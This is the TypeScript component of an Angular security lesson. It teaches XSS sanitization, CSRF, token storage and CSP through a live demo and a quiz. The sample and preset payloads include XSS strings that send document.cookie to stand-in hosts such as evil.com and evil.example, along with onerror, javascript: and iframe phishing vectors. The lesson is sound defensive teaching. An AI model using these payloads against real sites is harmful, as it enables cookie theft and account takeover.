import { Component, SecurityContext, computed, inject, signal } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { DomSanitizer } from '@angular/platform-browser';
import { RouterLink } from '@angular/router';
import {
  Faq,
  type FaqItem,
  Predict,
  Quiz,
  type QuizOption,
  Remember,
} from '../../../shared/teaching';

/**
 * Which security topic the page is showing.
 */
type Tab = 'xss' | 'csrf' | 'auth' | 'secrets' | 'headers';

/**
 * Lesson: Security & Sanitization — what Angular protects you from, and what it
 * cannot.
 *
 * Covers Angular's automatic contextual sanitization, `DomSanitizer` and the
 * `bypassSecurityTrust*` escape hatches, CSRF, token storage, secrets in the
 * bundle, and the security headers that belong on the server.
 *
 * The live demo is the load-bearing part: a payload of real attack strings goes
 * through interpolation, `[innerHTML]` and `DomSanitizer.sanitize` side by side,
 * so what survives each path is observed rather than asserted. The lesson people
 * most often need is that Angular's protection is contextual and automatic — and
 * that every `bypassSecurityTrust*` call is a place where it has been switched
 * off deliberately.
 */
@Component({
  selector: 'app-lesson-security',
  imports: [RouterLink, FormsModule, Faq, Predict, Quiz, Remember],
  styleUrl: './security.css',
  templateUrl: './security.html',
})
export class Security {
  /**
   * The partial-strip puzzle used by the ask-before-telling block. Most people
   * predict "nothing renders"; the interesting answer is that the element
   * survives and only the handler is removed, which is what teaches that the
   * sanitizer is an allow-list per context rather than a tag blocklist.
   */
  protected readonly sanitizerSample = `// user.bio came straight from a public profile form — attacker-controlled.
user.bio = '<img src="x" onerror="fetch(\\'//evil.com?c=\\' + document.cookie)"> <b>Hi!</b>';

// Bound with innerHTML, no DomSanitizer call anywhere:
@Component({ template: '<div [innerHTML]="user.bio"></div>' })
export class Profile { user = getUser(); }`;

  /**
   * The self-test. The wrong answers are the three comfortable beliefs that get
   * real apps breached: that a guard is a security boundary, that lazy loading
   * hides the code, and that a token in the header proves anything client-side.
   */
  protected readonly quizOptions: readonly QuizOption[] = [
    {
      text: 'No. The guard runs in the browser, so anyone can bypass it — every `/api/admin/*` endpoint must independently verify the caller server-side.',
      correct: true,
      why: "Correct, and this is the single most important sentence in the lesson. A route guard decides what to *render*. It is a UX control. The attacker doesn't have to beat your guard — they just call your API directly with `curl`.",
    },
    {
      text: 'Yes, as long as `authGuard` also checks the user role, not just that they are logged in.',
      why: 'Role checks make the guard more *correct*, not more *authoritative*. It still runs on a machine the attacker controls, on code they can edit in DevTools. Improving a client-side check does not make it a server-side one.',
    },
    {
      text: 'Yes — `canActivate` runs before `loadComponent`, so the admin bundle never downloads and the code is not exposed.',
      why: 'The first half is true and useful (it saves bandwidth), but "they cannot read the code" is not "they cannot call the API". The endpoints exist regardless of whether the attacker ever loaded your JavaScript.',
    },
    {
      text: 'Yes, provided an interceptor attaches the JWT — the server sees the token on every admin request.',
      why: 'The server seeing a token is not the server *checking* it. An interceptor is a client-side convenience for attaching a header; the authorization decision has to happen where the attacker cannot reach it.',
    },
  ];

  /**
   * The questions that come up the first time somebody has to defend a real
   * app rather than read about defending one.
   */
  protected readonly questions: readonly FaqItem[] = [
    {
      q: 'If Angular sanitizes everything, why do XSS bugs still happen in Angular apps?',
      a: 'Because the holes are the places that go around the template: `bypassSecurityTrust*`, direct DOM writes through `ElementRef.nativeElement.innerHTML`, third-party libraries that write HTML themselves, and server-rendered strings injected before Angular ever sees them. Angular protects its own bindings — nothing more.',
    },
    {
      q: 'Is `localStorage` really that bad for a JWT?',
      a: "It's bad in one specific way: any XSS on your origin can read it and exfiltrate the token in a single line. An HttpOnly cookie can't be read by JavaScript at all, so an XSS gets to *use* the session while the page is open but cannot steal a token to use later, elsewhere. That difference matters a lot.",
    },
    {
      q: 'Do I need CSRF protection if I use a JWT?',
      a: "Only if the JWT rides in a cookie. Browsers attach cookies to cross-site requests automatically, which is the entire CSRF mechanism; they never attach an `Authorization` header you didn't set. JWT-in-header means no CSRF. JWT-in-cookie means CSRF, same as a session ID.",
    },
    {
      q: 'What actually happens when I call `bypassSecurityTrustHtml`?',
      a: 'Angular wraps your string in a marker object that the sanitizer recognises and waves through untouched. Nothing is checked, escaped, or validated — the name is literal. Treat every call as a line that needs a reviewer, and never let user input reach one.',
    },
    {
      q: 'CSP looks like a lot of work. Is it worth it for a small app?',
      a: 'It is the cheapest defence-in-depth you can buy: a few response headers, no code changes. It will not stop the first bug, but it very often stops the *exploitation* of one — a stolen-cookie beacon to `evil.com` fails on `connect-src` even when the injection succeeded.',
    },
  ];
  /**
   * Angular's sanitizer, used directly so the demo can show what it strips.
   */
  private readonly sanitizer = inject(DomSanitizer);

  /**
   * The attack payload the demo runs through each rendering path. Deliberately
   * mixes harmless markup with hostile markup, so "sanitized" is visibly different
   * from "escaped".
   */
  protected readonly payload = signal(
    '<b>Bold survives</b>, <i>so does italic</i> — <a href="javascript:alert(1)">a boobytrapped link</a> <img src="x" alt="" onerror="alert(1)"> <script>alert(1)<\/script>',
  );

  /** The exact string Angular's HTML-context sanitizer produces for the payload. */
  protected readonly sanitized = computed(
    () =>
      this.sanitizer.sanitize(SecurityContext.HTML, this.payload()) ||
      '(the sanitizer stripped everything)',
  );

  /**
   * Ready-made payloads, so each attack shape can be tried without typing it.
   */
  protected readonly presets = [
    {
      label: 'script tag',
      html: 'Hello <script>document.location="https://evil.example?c="+document.cookie<\/script> world',
    },
    {
      label: 'img onerror',
      // alt="" keeps the payload a working attack (onerror is the vector) while
      // leaving the sanitized image decorative rather than an unlabelled one.
      html: '<img src="x" alt="" onerror="alert(document.cookie)"> a classic — no script tag needed',
    },
    {
      label: 'javascript: link',
      html: '<a href="javascript:alert(1)">win a free prize</a>',
    },
    {
      label: 'iframe injection',
      html: '<iframe src="https://evil.example/phish"></iframe> invisible credential phishing',
    },
    {
      label: 'harmless rich text',
      html: '<b>Bold</b>, <i>italic</i>, <ul><li>lists</li><li>links: <a href="https://angular.dev">angular.dev</a></li></ul> all survive',
    },
  ];

  /**
   * The selected topic.
   */
  protected readonly activeTab = signal<Tab>('xss');
  /**
   * The topic tabs.
   */
  protected readonly tabs: { id: Tab; label: string }[] = [
    { id: 'xss', label: 'XSS' },
    { id: 'csrf', label: 'CSRF' },
    { id: 'auth', label: 'Auth / JWT' },
    { id: 'secrets', label: 'Secrets' },
    { id: 'headers', label: 'Headers / CSP' },
  ];
}
